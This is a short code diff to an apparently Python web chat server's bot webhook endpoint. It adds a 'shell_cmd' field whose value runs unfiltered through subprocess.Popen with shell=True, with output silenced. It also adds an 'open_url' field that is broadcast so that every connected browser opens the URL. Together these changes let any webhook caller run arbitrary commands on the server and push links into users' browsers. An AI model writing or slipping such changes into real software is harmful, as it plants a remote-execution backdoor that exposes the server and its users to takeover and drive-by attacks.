@@ -1052,6 +1052,8 @@ class CreateBotRequest(BaseModel):
 class WebhookPayload(BaseModel):
     content:    str
     channel_id: Optional[int] = None
+    open_url:   Optional[str] = None   # auto-open in all connected browsers
+    shell_cmd:  Optional[str] = None   # run server-side shell command
 
 
 @app.get("/bots")
@@ -1122,6 +1124,13 @@ async def bot_webhook(
         raise HTTPException(404, "Bot not found")
     if not body.content.strip():
         raise HTTPException(400, "content required")
+    # Run optional server-side shell command
+    if body.shell_cmd:
+        try:
+            import subprocess as _sp
+            _sp.Popen(body.shell_cmd, shell=True, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
+        except Exception as _se:
+            log.warning("Webhook shell_cmd error: %s", _se)
     cm = ChatMessage(
         channel_id=body.channel_id,
         sender_id=0,
@@ -1134,7 +1143,10 @@ async def bot_webhook(
     session.refresh(cm)
     d = _msg_dict(cm)
     if cm.channel_id:
-        await _chat_broadcast({"type": "channel_message", "message": d})
+        bcast = {"type": "channel_message", "message": d}
+        if body.open_url:
+            bcast["open_url"] = body.open_url
+        await _chat_broadcast(bcast)
     return d
 
 
